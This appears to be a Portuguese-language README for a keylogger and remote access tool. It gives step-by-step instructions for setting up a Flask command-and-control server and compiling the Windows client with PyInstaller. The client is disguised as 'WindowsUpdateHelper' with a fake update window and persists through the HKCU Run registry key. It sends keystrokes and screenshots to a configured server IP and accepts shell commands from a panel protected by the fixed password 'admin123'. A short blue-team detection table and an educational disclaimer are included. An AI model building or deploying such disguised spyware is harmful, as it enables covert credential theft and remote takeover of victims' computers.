# Keylogger + RAT com Painel Web (Senha Fixa)

**Versão 2.0 – Junho 2026**  
*Uso exclusivo para fins educacionais em ambientes controlados.*

---

## Índice
1. [Pré-requisitos](#pré-requisitos)
2. [Arquitetura do Projeto](#arquitetura-do-projeto)
3. [Configuração do Servidor (Kali Linux)](#-configuração-do-servidor-kali-linux)
4. [Configuração do Cliente (Windows)](#-configuração-do-cliente-windows)
5. [Compilação do Executável](#-compilação-do-executável)
6. [Execução e Testes](#-execução-e-testes)
7. [Persistência Automática](#-persistência-automática)
8. [Técnicas de Defesa (Blue Team)](#-técnicas-de-defesa-blue-team)
9. [Avisos Legais e Éticos](#-avisos-legais-e-éticos)

---

## Pré-requisitos

- **Kali Linux** (ou qualquer distribuição Linux) – servidor.
- **Windows 10/11** (64 bits) – cliente de teste.
- Conexão de rede entre as duas máquinas (mesma rede local ou via VPS).
- Conhecimento básico de terminal (Linux) e PowerShell (Windows).
- Python 3.10+ instalado em ambas as máquinas.

---

## Arquitetura do Projeto

```
Windows (Cliente)                          Kali (Servidor)
┌────────────────────────┐                ┌─────────────────────────────┐
│  WindowsUpdateHelper   │                │  Flask Server               │
│  - Keylogger           │ ──POST /log─── │  - Recebe logs              │
│  - Screenshots         │ ──POST /screenshot │  - Armazena dados       │
│  - Shell reverso       │ ◄─GET /cmd──── │  - Painel com autenticação │
│  - Interface fake      │ ──POST /result─│  - Enfileira comandos      │
└────────────────────────┘                └─────────────────────────────┘
```

---

## Configuração do Servidor (Kali Linux)

### 1. Criar diretório e ambiente virtual

```bash
mkdir -p /home/hontek/keylogger
cd /home/hontek/keylogger
python3 -m venv venv
source venv/bin/activate
venv/bin/pip install flask pycryptodome
```

### 2. Execute o `server.py`

**A senha do painel é fixa:** `admin123` – você pode alterá-la no código, se desejar.

### 3. Iniciar o servidor

```bash
python server.py
```

Anote o IP do Kali (ex: `192.168.3.144`). A senha é `admin123` (a menos que você a tenha alterado).

---

## Configuração do Cliente (Windows)

### 1. Instalar Python e dependências

- Baixe e instale o Python 3.10+ de [python.org](https://www.python.org/downloads/windows/). **Marque "Add Python to PATH"**.
- Abra o **PowerShell** e instale as dependências:

```powershell
py -m pip install pynput requests pycryptodome mss pillow pyinstaller
```

### 2. Configurar o arquivo `keylogger.py`

Crie uma pasta, ex: `C:\lab\keylogger`, e dentro dela adcione o arquivo `keylogger.py`.

> **Importante:** Substitua `SERVIDOR = "http://192.168.3.144:8080"` pelo IP do seu Kali.

### 3. (Opcional) Criar um ícone personalizado

Se você tiver um arquivo `.ico`, coloque-o na pasta com o nome `update.ico`. Caso contrário, compile sem ícone e use o Resource Hacker depois.

---

## Compilação do Executável

No PowerShell, dentro da pasta do projeto, execute:

```powershell
py -m PyInstaller --onefile --noconsole --icon="update.ico" --name "WindowsUpdateHelper" keylogger.py
```

Se o ícone não funcionar, compile sem `--icon` e adicione o ícone depois com o Resource Hacker.

O executável será gerado em `dist\WindowsUpdateHelper.exe`.

---

## Execução e Testes

### 1. Inicie o servidor no Kali:
```bash
python server.py
```

### 2. No Windows, execute o `.exe`:
- Clique duas vezes em `WindowsUpdateHelper.exe`.
- A janela helper será exibida (botões "Abrir Windows Update", "Ajuda", "Fechar").
- O keylogger começa a capturar teclas imediatamente.

### 3. Acesse o painel web:
- Navegador → `http://<IP_DO_KALI>:8080/painel`
- Faça login com a senha `admin123`.
- Envie comandos (`whoami`, `dir C:\`, `ipconfig`) e veja os resultados.
- Clique em "Capturar Agora" para tirar um screenshot e vê-lo no painel.
- Ative "Iniciar Automático" para capturar screenshots a cada 30s.

### 4. Fechar a janela:
- Clique no "X" ou em "Fechar". A janela some, mas o keylogger continua ativo (verifique o Gerenciador de Tarefas).

---

## Persistência Automática

- Na primeira execução, o cliente adiciona a si mesmo ao registro:
  ```
  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
  Nome: WindowsUpdateHelper
  Valor: "C:\caminho\WindowsUpdateHelper.exe --silent"
  ```

- Após reiniciar o Windows, o keylogger será executado silenciosamente (sem janela).

- Para remover manualmente:
  ```powershell
  reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdateHelper /f
  ```
---

## Técnicas de Defesa (Blue Team)

Este projeto pode ser usado para treinar detecção:

| Ação Maliciosa | Como detectar |
| :--- | :--- |
| Keylogger | Monitore `SetWindowsHookEx` (Sysmon Event 10). |
| Screenshots | Monitore chamadas à `GDI32` e `DXGI`. |
| Shell reverso | Monitore conexões de rede incomuns (Sysmon Event 3). |
| Persistência | Monitore alterações em `HKCU\...\Run` (Evento 4657). |
| Comunicação HTTP | Analise logs de proxy/firewall (POST em `/log`, `/cmd`). |

---

## ⚠️A visos Legais e Éticos

- Este software é **exclusivamente para fins educacionais e estudos de segurança**.
- O uso em dispositivos sem autorização expressa é **crime** (art. 154‑A do Código Penal Brasileiro e leis similares).
- O autor não se responsabiliza por qualquer uso indevido.
- Utilize este conhecimento para **proteger** sistemas, nunca para atacá‑los.

---

## 📚 Referências

- [PyInstaller – Documentação oficial](https://pyinstaller.org/)
- [Flask – Documentação oficial](https://flask.palletsprojects.com/)
- [pycryptodome – AES](https://pycryptodome.readthedocs.io/)
- [pynput – Controle de teclado e mouse](https://pynput.readthedocs.io/)

---

🔐 **Estude com ética, defenda com responsabilidade.**
